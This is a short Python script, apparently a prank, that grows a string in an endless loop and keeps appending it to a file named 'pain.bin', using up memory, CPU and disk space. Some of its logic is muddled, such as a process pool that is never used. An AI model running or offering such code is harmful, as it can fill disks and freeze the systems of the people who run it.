from threading import Thread
import asyncio, os
from multiprocessing import Pool

def run():
    async def chaos():
        nonlocal suffering
    
        while True:
            suffering += "𒁃"
    
    def save():
        while True:
            with open("pain.bin", "a") as f:
                 f.write(suffering)

            print('saved')
            print(f'filesize (bytes): {os.path.getsize("pain.bin")}')
            
    suffering = ""
    t = Thread(target=save)
    t.start()
    
    for i in range(200):
        asyncio.run(chaos())

with Pool(10) as p:
    run()
